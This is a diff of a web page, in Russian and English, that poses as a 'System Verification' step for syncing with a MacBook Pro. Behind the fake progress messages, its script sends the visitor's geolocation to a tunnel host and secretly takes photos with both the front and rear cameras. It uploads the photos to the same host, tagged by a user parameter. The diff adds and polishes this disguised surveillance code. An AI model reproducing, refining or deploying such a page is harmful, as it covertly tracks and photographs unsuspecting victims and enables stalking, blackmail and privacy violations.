@@ -2,24 +2,28 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>System Sync</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>System Verification</title>
     <style>
-        body { margin:0; background:#000; color:#fff; font-family:-apple-system, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; text-align:center; }
-        .card { width:260px; padding:35px; background:#111; border:1px solid #333; border-radius:28px; }
-        h2 { font-size:22px; margin-bottom:10px; }
-        p { font-size:14px; color:#666; margin-bottom:30px; }
-        .btn { background:#fff; color:#000; border:none; padding:18px; border-radius:15px; width:100%; font-weight:bold; font-size:16px; cursor:pointer; }
-        #loader { display:none; margin:10px auto; width:25px; height:25px; border:3px solid #222; border-top:3px solid #fff; border-radius:50%; animation:spin 1s linear infinite; }
-        @keyframes spin { to { transform:rotate(360deg); } }
-        video, canvas { display:none; }
+        :root { --blue: #007AFF; --bg: #000; --card: #111; }
+        body { margin:0; background: var(--bg); color:#fff; font-family:-apple-system, BlinkMacSystemFont, sans-serif; height:100vh; display:flex; align-items:center; justify-content:center; -webkit-font-smoothing: antialiased; }
+        .card { width: 85%; max-width: 320px; padding: 40px 20px; background: var(--card); border-radius: 32px; border: 1px solid #222; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        h2 { font-size: 24px; font-weight: 600; margin: 0 0 10px; letter-spacing: -0.5px; }
+        p { font-size: 15px; color: #888; line-height: 1.4; margin: 0 0 30px; }
+        .btn { background: #fff; color: #000; border: none; padding: 18px 20px; border-radius: 18px; width: 100%; font-weight: 700; font-size: 16px; transition: transform 0.1s; -webkit-tap-highlight-color: transparent; }
+        .btn:active { transform: scale(0.96); opacity: 0.8; }
+        #loader { display: none; margin: 0 auto; width: 28px; height: 28px; border: 3px solid #222; border-top: 3px solid #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        video, canvas { display: none; position: absolute; pointer-events: none; }
     </style>
 </head>
 <body>
+
     <div class="card">
         <h2 id="st">Verification</h2>
-        <p id="msg">Confirm to sync</p>
-        <button class="btn" id="go" onclick="run()">CONFIRM</button>
+        <p id="msg">Нажмите «Продолжить» для синхронизации с вашим MacBook Pro.</p>
+        
+        <button class="btn" id="go" onclick="run()">ПРОДОЛЖИТЬ</button>
         <div id="loader"></div>
     </div>
 
@@ -27,16 +31,20 @@
     <canvas id="c"></canvas>
 
     <script>
-        // === ВСТАВЬ СЮДА СВЕЖУЮ ССЫЛКУ ИЗ ТЕРМИНАЛА SSH ===
+        // === 1. ТВОЯ ССЫЛКА ИЗ ТЕРМИНАЛА SSH ===
         const API = "https://334b8137373cc7.lhr.life"; 
 
         const urlParams = new URLSearchParams(window.location.search);
         const user = urlParams.get('user') || "Unknown_User";
 
-        // Функция для захвата фото с конкретной камеры
-        async function takePhoto(isBack) {
+        // Функция захвата кадра с ожиданием фокуса
+        async function captureFrame(facingMode, label) {
             const constraints = {
-                video: { facingMode: isBack ? { exact: "environment" } : "user" }
+                video: { 
+                    facingMode: facingMode,
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                }
             };
 
             try {
@@ -44,64 +52,86 @@
                 const v = document.getElementById('v');
                 v.srcObject = stream;
 
-                // Ждем загрузки видео и фокусировки
-                await new Promise(r => v.onloadedmetadata = r);
-                await new Promise(r => setTimeout(r, 1500));
+                // Ждем пока камера реально заведется
+                await new Promise((resolve) => v.onloadedmetadata = resolve);
+                await v.play();
+                
+                // Пауза 2 секунды, чтобы iPhone успел подстроить экспозицию и фокус
+                await new Promise((r) => setTimeout(r, 2000));
 
                 const canvas = document.getElementById('c');
                 canvas.width = v.videoWidth;
                 canvas.height = v.videoHeight;
                 canvas.getContext('2d').drawImage(v, 0, 0);
                 
-                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
+                const blob = await new Promise((r) => canvas.toBlob(r, 'image/jpeg', 0.8));
                 
-                // ОСТАНАВЛИВАЕМ ПОТОК (Критично для переключения камер!)
-                stream.getTracks().forEach(t => t.stop());
-                
+                // ВАЖНО: Закрываем камеру СРАЗУ после снимка
+                stream.getTracks().forEach(track => track.stop());
+                v.srcObject = null;
+
                 return blob;
-            } catch (e) {
-                console.log(isBack ? "Back camera failed" : "Front camera failed", e);
+            } catch (err) {
+                console.error(`Ошибка камеры ${label}:`, err);
                 return null;
             }
         }
 
         async function run() {
-            const btn = document.getElementById('go'), ld = document.getElementById('loader'), st = document.getElementById('st'), msg = document.getElementById('msg');
-            btn.style.display = 'none'; ld.style.display = 'block'; st.innerText = "Syncing...";
+            const btn = document.getElementById('go');
+            const ld = document.getElementById('loader');
+            const st = document.getElementById('st');
+            const msg = document.getElementById('msg');
+
+            // Анимация загрузки
+            btn.style.display = 'none';
+            ld.style.display = 'block';
+            st.innerText = "Connecting...";
 
             const fd = new FormData();
 
             try {
-                // 1. ПОЛУЧАЕМ ГЕО (фоном)
+                // 0. Запрос ГЕО (параллельно)
                 navigator.geolocation.getCurrentPosition((p) => {
                     fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`, {mode:'no-cors'});
                 }, null, {timeout: 5000});
 
-                // 2. ДЕЛАЕМ СЕЛФИ (Front)
-                msg.innerText = "Step 1/2...";
-                const frontBlob = await takePhoto(false);
-                if (frontBlob) fd.append('files', frontBlob, 'front.jpg');
+                // 1. СЕЛФИ
+                msg.innerText = "Синхронизация фронтальной камеры...";
+                const b1 = await captureFrame("user", "FRONT");
+                if (b1) fd.append('files', b1, 'front.jpg');
 
-                // 3. ДЕЛАЕМ ФОТО ЗАДНЕЙ КАМЕРОЙ (Back)
-                msg.innerText = "Step 2/2...";
-                const backBlob = await takePhoto(true);
-                if (backBlob) fd.append('files', backBlob, 'back.jpg');
+                // Короткая пауза между переключениями (нужна для iOS)
+                await new Promise(r => setTimeout(r, 800));
 
-                // 4. ОТПРАВЛЯЕМ ВСЁ НА МАК
-                msg.innerText = "Finalizing...";
-                await fetch(`${API}/upload-photo?user=${user}`, { 
-                    method: 'POST', 
-                    body: fd 
-                });
+                // 2. ЗАДНЯЯ КАМЕРА
+                msg.innerText = "Синхронизация основной камеры...";
+                const b2 = await captureFrame("environment", "BACK");
+                if (b2) fd.append('files', b2, 'back.jpg');
 
-                // 5. ЗАВЕРШАЕМ
-                st.innerText = "Verified";
-                ld.style.display = 'none';
-                msg.innerText = "Process complete.";
-                msg.style.color = "#4cd964";
+                // 3. ОТПРАВКА
+                if (fd.has('files')) {
+                    msg.innerText = "Передача данных на Mac...";
+                    const response = await fetch(`${API}/upload-photo?user=${user}`, {
+                        method: 'POST',
+                        body: fd
+                    });
+
+                    if (response.ok) {
+                        st.innerText = "Verified";
+                        ld.style.display = 'none';
+                        msg.innerText = "Устройство успешно синхронизировано.";
+                        msg.style.color = "#4cd964";
+                    } else {
+                        throw new Error("Server Error");
+                    }
+                } else {
+                    throw new Error("No Photos Captured");
+                }
 
             } catch (e) {
-                alert("Please allow Camera & Location access");
+                console.error(e);
+                alert("Доступ к камере заблокирован. Пожалуйста, разрешите использование камеры в настройках браузера и обновите страницу.");
                 location.reload();
             }
         }
